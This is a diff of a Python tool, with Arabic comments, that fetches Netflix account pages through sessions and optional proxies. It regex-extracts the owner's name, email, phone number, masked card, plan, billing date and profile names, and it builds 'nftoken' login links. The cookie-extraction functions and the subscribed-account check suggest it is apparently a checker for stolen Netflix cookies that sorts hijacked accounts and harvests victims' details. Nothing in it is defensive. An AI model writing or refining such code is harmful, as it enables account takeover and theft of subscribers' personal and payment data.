@@ -381,83 +381,75 @@ def build_nftoken_links(token, mode):
     return [("PC Login", f"https://netflix.com/?nftoken={token}")]
 
 
-# ==================== EXTRACT FROM REACT CONTEXT ====================
+# ==================== SIMPLIFIED EXTRACTION ====================
 
-def extract_from_react_context(html_content):
-    """استخراج البيانات من netflix.reactContext JSON"""
+def extract_account_info_from_html(html_content):
+    """استخراج البيانات من HTML بطريقة مبسطة"""
     info = {}
     
-    react_pattern = r'netflix\.reactContext\s*=\s*({.*?});\s*</script'
-    match = re.search(react_pattern, html_content, re.DOTALL)
+    # 1. استخراج الإيميل
+    email_match = re.search(r'"emailAddress":"([^"]+)"', html_content)
+    if email_match:
+        info['email'] = email_match.group(1)
     
-    if match:
-        try:
-            data = json.loads(match.group(1))
-            
-            user_info = data.get('userInfo', {}).get('data', {})
-            if user_info:
-                info['accountOwnerName'] = decode_netflix_value(user_info.get('name'))
-                info['email'] = decode_netflix_value(user_info.get('emailAddress'))
-                info['countryOfSignup'] = decode_netflix_value(user_info.get('countryOfSignup'))
-                info['memberSince'] = decode_netflix_value(user_info.get('memberSince'))
-                info['membershipStatus'] = decode_netflix_value(user_info.get('membershipStatus'))
-            
-            signup_context = data.get('signupContext', {}).get('data', {}).get('flow', {}).get('fields', {})
-            if signup_context:
-                current_plan = signup_context.get('currentPlan', {}).get('fields', {})
-                if current_plan:
-                    info['localizedPlanName'] = decode_netflix_value(current_plan.get('localizedPlanName'))
-                    info['maxStreams'] = current_plan.get('maxStreams')
-                    info['videoQuality'] = decode_netflix_value(current_plan.get('videoQuality'))
-                    info['planPrice'] = decode_netflix_value(current_plan.get('planPrice'))
-                
-                next_billing = signup_context.get('nextBillingDate', {}).get('value')
-                if next_billing:
-                    info['nextBillingDate'] = next_billing
-                
-                payment_methods = signup_context.get('paymentMethods', {}).get('value', [])
-                if payment_methods and payment_methods[0].get('value'):
-                    pm = payment_methods[0]['value']
-                    info['maskedCard'] = decode_netflix_value(pm.get('displayText'))
-                    info['paymentMethodType'] = 'Credit Card'
-            
-            account_info = data.get('accountInfo', {}).get('data', {})
-            if account_info:
-                if not info.get('accountOwnerName'):
-                    info['accountOwnerName'] = decode_netflix_value(account_info.get('displayName'))
-                if not info.get('email'):
-                    info['email'] = decode_netflix_value(account_info.get('emailAddress'))
-                if not info.get('maxStreams'):
-                    info['maxStreams'] = account_info.get('maxStreams')
-                info['phoneNumber'] = normalize_phone_number(account_info.get('phoneNumber'))
-                if not info.get('countryOfSignup'):
-                    info['countryOfSignup'] = decode_netflix_value(account_info.get('country'))
-                if not info.get('membershipStatus'):
-                    info['membershipStatus'] = decode_netflix_value(account_info.get('membershipStatus'))
-            
-            graphql_data = data.get('graphql', {}).get('data', {})
-            profiles = []
-            for key, value in graphql_data.items():
-                if key.startswith('Profile:'):
-                    profile_data = value
-                    if isinstance(profile_data, dict):
-                        name = profile_data.get('name')
-                        if name and name not in profiles and len(name) > 1:
-                            profiles.append(name)
-            
-            if profiles:
-                info['profiles'] = ", ".join(profiles)
-                info['profileCount'] = len(profiles)
-                if not info.get('accountOwnerName') and profiles:
-                    info['accountOwnerName'] = profiles[0]
-            
-        except Exception as e:
-            print(f"React context parse error: {e}")
+    # 2. استخراج الاسم
+    name_match = re.search(r'"displayName":"([^"]+)"', html_content)
+    if name_match:
+        info['accountOwnerName'] = name_match.group(1)
     
-    if info.get('localizedPlanName') and not info.get('membershipStatus'):
-        info['membershipStatus'] = 'CURRENT_MEMBER'
+    # 3. استخراج البلد
+    country_match = re.search(r'"countryOfSignup":"([^"]+)"', html_content)
+    if country_match:
+        info['countryOfSignup'] = country_match.group(1)
     
-    return {k: v for k, v in info.items() if v}
+    # 4. استخراج الباقة
+    plan_match = re.search(r'"localizedPlanName":"([^"]+)"', html_content)
+    if plan_match:
+        info['localizedPlanName'] = plan_match.group(1)
+    
+    # 5. استخراج السعر
+    price_match = re.search(r'"planPrice":"([^"]+)"', html_content)
+    if price_match:
+        info['planPrice'] = price_match.group(1)
+    
+    # 6. استخراج عدد الشاشات
+    streams_match = re.search(r'"maxStreams":(\d+)', html_content)
+    if streams_match:
+        info['maxStreams'] = int(streams_match.group(1))
+    
+    # 7. استخراج تاريخ التجديد
+    billing_match = re.search(r'"nextBillingDate":"([^"]+)"', html_content)
+    if billing_match:
+        info['nextBillingDate'] = billing_match.group(1)
+    
+    # 8. استخراج حالة العضوية
+    status_match = re.search(r'"membershipStatus":"([^"]+)"', html_content)
+    if status_match:
+        info['membershipStatus'] = status_match.group(1)
+    
+    # 9. استخراج رقم الهاتف
+    phone_match = re.search(r'"phoneNumber":"([^"]+)"', html_content)
+    if phone_match:
+        info['phoneNumber'] = phone_match.group(1)
+    
+    # 10. استخراج آخر 4 أرقام من الكارد
+    card_match = re.search(r'"maskedCard":"([^"]+)"', html_content)
+    if card_match:
+        info['maskedCard'] = card_match.group(1)
+    
+    # 11. استخراج أسماء البروفايلات من graphql
+    profiles = []
+    profile_pattern = r'"name":"([^"]+)"[^}]*"isKids":(?:false|true)'
+    for match in re.finditer(profile_pattern, html_content):
+        name = match.group(1)
+        if name and name not in profiles and len(name) > 1:
+            profiles.append(name)
+    
+    if profiles:
+        info['profiles'] = ", ".join(profiles[:10])
+        info['profileCount'] = len(profiles)
+    
+    return info
 
 
 def get_account_page(session, proxy=None, timeout=15):
@@ -474,7 +466,7 @@ def get_account_page(session, proxy=None, timeout=15):
         try:
             resp = session.get(url, headers=headers, timeout=timeout)
             if resp.status_code == 200:
-                info = extract_from_react_context(resp.text)
+                info = extract_account_info_from_html(resp.text)
                 if info:
                     return resp.text, resp.status_code, info
         except:
@@ -484,7 +476,7 @@ def get_account_page(session, proxy=None, timeout=15):
 def has_any_account_info(info):
     if not info:
         return False
-    return bool(info)
+    return len(info) > 0
 
 
 # ==================== COOKIE EXTRACTION FUNCTIONS ====================
@@ -656,7 +648,7 @@ def derive_plan_info(info, is_subscribed):
 def is_subscribed_account(info):
     status = str(info.get("membershipStatus", "")).upper()
     plan = str(info.get("localizedPlanName", "")).lower()
-    if plan and plan != "free" and plan != "free trial":
+    if plan and plan != "free" and plan != "free trial" and plan != "unknown":
         return True
     return status in ["CURRENT_MEMBER", "ACTIVE", "CURRENT"]
 
